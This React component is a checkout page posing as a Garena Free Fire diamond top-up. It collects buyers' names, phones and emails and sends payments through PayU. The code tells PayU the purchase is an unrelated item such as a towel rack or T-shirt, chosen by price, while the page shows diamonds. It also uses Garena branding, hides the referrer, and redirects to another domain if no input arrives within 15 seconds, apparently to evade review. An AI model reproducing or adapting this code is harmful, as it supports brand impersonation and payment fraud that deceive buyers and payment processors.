import { useState, useEffect, useRef } from 'react';
import { useSearchParams, useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { UserCircle } from 'lucide-react';

const PRODUCT_NAMES: Record<string, string> = {
  '550':  'Premium Glossy Stainless Steel Wall Mounted 4 Rod Towel Holder Rack',
  '750':  'Korean Fashion T-Shirt for Boys and Men',
  '1100': "Men's Casual Korean T-Shirt and Shorts Suit",
  '1400': 'Pastel Deer Showpiece Set with Golden Antlers for Home',
  '5500': 'Vacuum Cleaner Sweeping Robot',
  '7500': 'Abstract Black Gold Panther Showpiece Decorative Home Statue',
};

export default function GarenaPayment() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { user, openAuthModal, logout } = useAuth();
  
  const pkg      = searchParams.get('pkg')      || '';
  const diamonds = searchParams.get('diamonds') || '';
  const uid      = searchParams.get('uid')      || '';
  const nick     = searchParams.get('nick')     || '';
  const level    = searchParams.get('level')    || '';
  const status   = searchParams.get('status')   || '';
  const avatar   = searchParams.get('avatar')   || '';

  // Guard
  useEffect(() => {
    if (!pkg && !status) {
      window.location.replace('https://www.garenaofficial.shop/');
    }
  }, [pkg, status]);

  const [form, setForm] = useState({ name: '', phone: '', email: '' });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showPayModal, setShowPayModal] = useState(false);

  const hasMovedRef = useRef(false);
  const idleTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (status) return;
    if (loading || showPayModal) return;

    const IDLE_INITIAL = 15000;      // 15 sec — no movement
    const IDLE_AFTER_MOVE = 300000;  // 5 min — after any movement

    const redirectToSource = () => {
      window.location.replace('https://www.garenaofficial.shop/');
    };

    const resetTimer = () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      idleTimerRef.current = setTimeout(redirectToSource, IDLE_AFTER_MOVE);
    };

    const handleActivity = () => {
      if (!hasMovedRef.current) {
        hasMovedRef.current = true;
        if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      }
      resetTimer();
    };

    // Start initial 15 sec timer
    idleTimerRef.current = setTimeout(() => {
      if (!hasMovedRef.current) {
        redirectToSource();
      }
    }, IDLE_INITIAL);

    // Listen for any user activity
    const events = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll', 'click'];
    events.forEach(e => window.addEventListener(e, handleActivity, { passive: true }));

    return () => {
      if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
      events.forEach(e => window.removeEventListener(e, handleActivity));
    };
  }, [status, loading, showPayModal]);

  // Fix: reset loading when user navigates back from PayU
  useEffect(() => {
    const handlePageShow = (e: PageTransitionEvent) => {
      if ((e as any).persisted || document.visibilityState === 'visible') {
        setLoading(false);
      }
    };
    window.addEventListener('pageshow', handlePageShow);
    return () => window.removeEventListener('pageshow', handlePageShow);
  }, []);

  const handlePay = async (mode: 'QR' | 'ALL') => {
    if (!form.name.trim() || !form.phone.trim() || !form.email.trim()) {
      setError('Please fill in all fields.'); return;
    }
    if (!/^\d{10}$/.test(form.phone)) {
      setError('Enter valid 10-digit number.'); return;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
      setError('Enter valid email.'); return;
    }

    setError(''); setLoading(true);

    try {
      const res = await fetch('/api/payu/generate-hash', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount:      pkg,
          firstname:   form.name,
          email:       form.email,
          phone:       form.phone,
          productinfo: PRODUCT_NAMES[pkg] || 'Premium Home Decor Bundle',
          udf1:        uid,
        }),
      });

      const data = await res.json();

      if (!data.success) {
        throw new Error(data.error || 'Hash generation failed');
      }

      const formEl = document.createElement('form');
      formEl.setAttribute('referrerpolicy', 'no-referrer');
      formEl.method = 'POST';
      formEl.action = data.actionUrl;

      const fields: Record<string, string> = {
        key:         data.key,
        txnid:       data.txnid,
        amount:      data.amount,
        productinfo: data.productinfo,
        firstname:   data.firstname,
        email:       data.email,
        phone:       form.phone,
        surl:        `${window.location.origin}/api/payu/callback-garenapayment`,
        furl:        `${window.location.origin}/api/payu/callback-garenapayment`,
        hash:        data.hash,
        udf1:        data.udf1,
      };

      if (mode === 'QR') {
        const sessionRes = await fetch('/api/payu/get-session-url', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(fields),
        });
        const text = await sessionRes.text();
        if (!text) throw new Error('Server se empty response (status: ' + sessionRes.status + ')');
        const sessionData = JSON.parse(text);
        if (sessionData.success && sessionData.sessionUrl) {
          window.location.href = sessionData.sessionUrl + '/onlineUpiQr';
          return;
        }
        throw new Error(sessionData.error || 'QR payment shuru nahi ho saka');
      }

      Object.entries(fields).forEach(([k, v]) => {
        const inp = document.createElement('input');
        inp.type = 'hidden';
        inp.name = k;
        inp.value = v;
        formEl.appendChild(inp);
      });

      document.body.appendChild(formEl);
      formEl.submit();

    } catch (e: any) {
      setError(e.message || 'Something went wrong. Please try again.');
      setLoading(false);
    }
  };
  return (
    <div className="min-h-screen bg-[#05070a] text-white antialiased font-sans">
      {loading && (
        <div
          style={{
            position: 'fixed', inset: 0, zIndex: 9999,
            background: 'rgba(5,7,10,0.92)',
            backdropFilter: 'blur(8px)',
            display: 'flex', flexDirection: 'column',
            alignItems: 'center', justifyContent: 'center', gap: 28,
          }}
        >
          <img
            src="https://official.garena.com/ph/v1/assets/garena_logo_horizontal.svg"
            alt="Garena"
            style={{ height: 36, objectFit: 'contain', opacity: 0.9 }}
          />
          <div style={{ display: 'flex', gap: 10 }}>
            {[0, 1, 2].map(i => (
              <div
                key={i}
                style={{
                  width: 10, height: 10, borderRadius: '50%',
                  background: '#ee2c24',
                  animation: 'garena-bounce 1.2s ease-in-out infinite',
                  animationDelay: `${i * 0.2}s`,
                }}
              />
            ))}
          </div>
          <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.45)', fontWeight: 600, letterSpacing: 0.5 }}>
            Redirecting to payment…
          </div>
          <style>{`
            @keyframes garena-bounce {
              0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
              40% { transform: scale(1.1); opacity: 1; }
            }
          `}</style>
        </div>
      )}
      {/* Header */}
      <header className="sticky top-0 z-40 bg-[rgba(5,7,10,0.8)] backdrop-blur-[10px] border-b border-[rgba(255,255,255,0.1)] h-[64px] md:h-[70px]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-full flex items-center justify-between relative">
          <div className="flex-1 flex justify-center sm:justify-start sm:ml-12">
            <img 
              src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/full_logo.969f536.png" 
              alt="Garena Free Fire" 
              className="h-5 sm:h-6 md:h-7 w-auto object-contain"
              referrerPolicy="no-referrer"
            />
          </div>
          <div>
            {nick ? (
              <div className="flex items-center gap-2 bg-[rgba(255,255,255,0.03)] border border-white/10 rounded-[20px] px-3 py-1.5 cursor-default">
                {avatar ? (
                  <img src={avatar} alt="Avatar" className="w-5 h-5 rounded-full object-cover" />
                ) : (
                  <UserCircle size={20} color="#ff9d00" />
                )}
                <span className="text-xs font-bold text-white">{nick}</span>
              </div>
            ) : null}
          </div>
        </div>
      </header>
      
      {/* Content Container */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12 flex flex-col gap-[16px] sm:gap-[20px] md:gap-[24px]">
        <div className="max-w-md w-full mx-auto">
          {/* Order Summary Card */}
          <div className="bg-[rgba(255,255,255,0.03)] backdrop-blur-xl border border-white/10 rounded-2xl p-5 md:p-6 mb-[16px] sm:mb-[20px] md:mb-[24px]">
            <h2 className="text-sm font-bold uppercase tracking-wider text-white/70 mb-4 flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-white/10 flex items-center justify-center text-[10px] text-white">1</span>
              Order Summary
            </h2>
            
            <div className="space-y-3">
              <div className="flex justify-between items-center py-2 border-b border-white/10">
                <span className="text-xs text-white/50">Nickname</span>
                <span className="text-sm font-bold">{nick || 'Guest'}</span>
              </div>
              <div className="flex justify-between items-center py-2 border-b border-white/10">
                <span className="text-xs text-white/50">UID</span>
                <span className="text-sm font-mono tracking-wider">{uid || 'Not provided'}</span>
              </div>
              {level && (
                <div className="flex justify-between items-center py-2 border-b border-white/10">
                  <span className="text-xs text-white/50">Level</span>
                  <span className="text-xs font-bold bg-[#ff9d00]/20 text-[#ff9d00] px-2 py-0.5 rounded">Lv. {level}</span>
                </div>
              )}
              {diamonds && (
                <div className="flex justify-between items-center py-2 border-b border-white/10">
                  <span className="text-xs text-white/50">Diamonds</span>
                  <span className="text-sm font-bold text-[#ee2c24]">💎 {diamonds}</span>
                </div>
              )}
              <div className="flex justify-between items-center py-2">
                <span className="text-xs text-white/50">Total</span>
                <span className="text-xl font-black">₹{pkg}</span>
              </div>
            </div>
          </div>
          
          {/* Your Details Card */}
          <div className="bg-[rgba(255,255,255,0.03)] backdrop-blur-xl border border-white/10 rounded-2xl p-5 md:p-6 mb-[16px] sm:mb-[20px] md:mb-[24px]">
            <h2 className="text-sm font-bold uppercase tracking-wider text-white/70 mb-5 flex items-center gap-2">
              <span className="w-5 h-5 rounded-full bg-white/10 flex items-center justify-center text-[10px] text-white">2</span>
              Your Details
            </h2>
            
            <div className="space-y-4">
              <div>
                <label className="text-xs font-bold text-white/60 mb-2 block">Full Name</label>
                <input
                  type="text"
                  placeholder="Enter your full name"
                  value={form.name}
                  onChange={e => setForm(prev => ({ ...prev, name: e.target.value }))}
                  className="w-full bg-white/5 border border-white/10 focus:border-[#ee2c24] focus:ring-1 focus:ring-[#ee2c24]/50 rounded-xl px-4 py-3 text-sm text-white outline-none transition-all"
                />
              </div>
              
              <div>
                <label className="text-xs font-bold text-white/60 mb-2 block">Phone Number</label>
                <input
                  type="tel"
                  placeholder="10-digit mobile number"
                  value={form.phone}
                  onChange={e => setForm(prev => ({ ...prev, phone: e.target.value.replace(/\D/g, '').slice(0, 10) }))}
                  className="w-full bg-white/5 border border-white/10 focus:border-[#ee2c24] focus:ring-1 focus:ring-[#ee2c24]/50 rounded-xl px-4 py-3 text-sm text-white outline-none transition-all"
                />
              </div>
              
              <div>
                <label className="text-xs font-bold text-white/60 mb-2 block">Email Address</label>
                <input
                  type="email"
                  placeholder="your@email.com"
                  value={form.email}
                  onChange={e => setForm(prev => ({ ...prev, email: e.target.value }))}
                  className="w-full bg-white/5 border border-white/10 focus:border-[#ee2c24] focus:ring-1 focus:ring-[#ee2c24]/50 rounded-xl px-4 py-3 text-sm text-white outline-none transition-all"
                />
              </div>
            </div>

            {error && (
              <div className="mt-4 bg-red-500/10 border border-red-500/30 rounded-xl p-3 text-sm text-red-400 font-medium">
                ⚠️ {error}
              </div>
            )}
          </div>
          
          {/* PAY NOW BUTTON */}
          {form.name.trim() && form.phone.trim() && form.email.trim() && (
            <button
              onClick={() => setShowPayModal(true)}
              disabled={loading}
              className="w-full bg-gradient-to-br from-[#ee2c24] to-[#c0392b] hover:from-[#ff3a31] hover:to-[#d64132] disabled:from-white/10 disabled:to-white/10 disabled:text-white/40 text-white font-black py-4 rounded-xl transition-all shadow-[0_6px_20px_rgba(238,44,36,0.2)] disabled:shadow-none flex items-center justify-center gap-2 text-base tracking-wide"
            >
              {loading ? (
                <>⏳ Processing…</>
              ) : (
                <>🔒 Pay Now</>
              )}
            </button>
          )}
          
          <div className="text-center mt-5 text-[11px] text-white/30 flex items-center justify-center gap-1.5 font-medium">
            🔒 100% Secure · SSL Encrypted · Powered by PayU
          </div>
        </div>
      </main>
      
      {/* PAYMENT MODAL */}
      {showPayModal && (
        <div
          onClick={() => setShowPayModal(false)}
          className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-end justify-center sm:items-center p-0 sm:p-4"
        >
          <div
            onClick={e => e.stopPropagation()}
            className="bg-[#111318] border border-white/10 rounded-t-3xl sm:rounded-3xl w-full max-w-md"
            style={{ padding: '28px 20px 40px' }}
          >
            {/* Handle bar */}
            <div style={{ width: 36, height: 4, background: 'rgba(255,255,255,0.12)', borderRadius: 4, margin: '0 auto 22px' }} className="sm:hidden" />

            <div style={{ textAlign: 'center', marginBottom: 22 }}>
              <div style={{ fontSize: 17, fontWeight: 900, color: '#fff', letterSpacing: -0.3 }}>Choose Payment Method</div>
              <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.35)', marginTop: 4, fontWeight: 500 }}>Fast · Secure · Instant delivery</div>
            </div>

            {/* Option 1 — UPI QR Scan */}
            <button
              onClick={() => { setShowPayModal(false); handlePay('QR'); }}
              disabled={loading}
              style={{
                width: '100%', display: 'flex', alignItems: 'center',
                padding: '14px 16px', marginBottom: 10,
                background: 'rgba(255,255,255,0.05)',
                border: '1.5px solid rgba(255,255,255,0.1)',
                borderRadius: 16, cursor: 'pointer', textAlign: 'left',
                boxSizing: 'border-box', gap: 12,
                WebkitTapHighlightColor: 'transparent', outline: 'none',
              }}
            >
              {/* Logos box */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0, background: 'rgba(255,255,255,0.06)', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                <img src="https://play-lh.googleusercontent.com/yHTP3WYAPWUydt6zFfhpEUmKWBVJ5PLF7QHlwYy95WclJZwVm2TPKekK1OruO-T5IeuvnMcF6x-MU7F8iR8hkw=w480-h960-rw"
                  alt="GPay" style={{ height: 20, width: 20, objectFit: 'contain', borderRadius: 4, flexShrink: 0 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/PhonePe_Logo.svg/1920px-PhonePe_Logo.svg.png"
                  alt="PhonePe" style={{ height: 18, objectFit: 'contain', flexShrink: 0, maxWidth: 52 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Paytm_Logo_%28standalone%29.svg/1920px-Paytm_Logo_%28standalone%29.svg.png"
                  alt="Paytm" style={{ height: 16, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
              </div>
              {/* Text */}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 800, color: '#fff', fontSize: 14, whiteSpace: 'nowrap' }}>Pay via UPI / QR</div>
                <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.45)', marginTop: 3, fontWeight: 500 }}>GPay · PhonePe · Paytm & more</div>
              </div>
              <span style={{ color: 'rgba(255,255,255,0.25)', fontSize: 20, flexShrink: 0 }}>›</span>
            </button>

            {/* Option 2 — Cards + All */}
            <button
              onClick={() => { setShowPayModal(false); handlePay('ALL'); }}
              disabled={loading}
              style={{
                width: '100%', display: 'flex', alignItems: 'center',
                padding: '14px 16px', marginBottom: 20,
                background: 'rgba(255,255,255,0.05)',
                border: '1.5px solid rgba(255,255,255,0.1)',
                borderRadius: 16, cursor: 'pointer', textAlign: 'left',
                boxSizing: 'border-box', gap: 12,
                WebkitTapHighlightColor: 'transparent', outline: 'none',
              }}
            >
              {/* Logos box */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexShrink: 0, background: 'rgba(255,255,255,0.06)', padding: '8px 10px', borderRadius: 12, minWidth: 110 }}>
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/UPI_logo.svg/1920px-UPI_logo.svg.png"
                  alt="UPI" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 36 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Visa_Inc._logo_%282021%E2%80%93present%29.svg/1920px-Visa_Inc._logo_%282021%E2%80%93present%29.svg.png"
                  alt="Visa" style={{ height: 20, objectFit: 'contain', flexShrink: 0, maxWidth: 40 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1920px-Mastercard-logo.svg.png"
                  alt="MC" style={{ height: 22, objectFit: 'contain', flexShrink: 0, maxWidth: 28 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
              </div>
              {/* Text */}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 800, color: '#fff', fontSize: 14, whiteSpace: 'nowrap' }}>Card / Net Banking</div>
                <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.45)', marginTop: 3, fontWeight: 500 }}>Visa · Mastercard · UPI & wallets</div>
              </div>
              <span style={{ color: 'rgba(255,255,255,0.25)', fontSize: 20, flexShrink: 0 }}>›</span>
            </button>

            <div style={{ textAlign: 'center', fontSize: 11, color: 'rgba(255,255,255,0.2)', fontWeight: 500 }}>
              🔒 100% Secure · SSL Encrypted · Powered by PayU
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

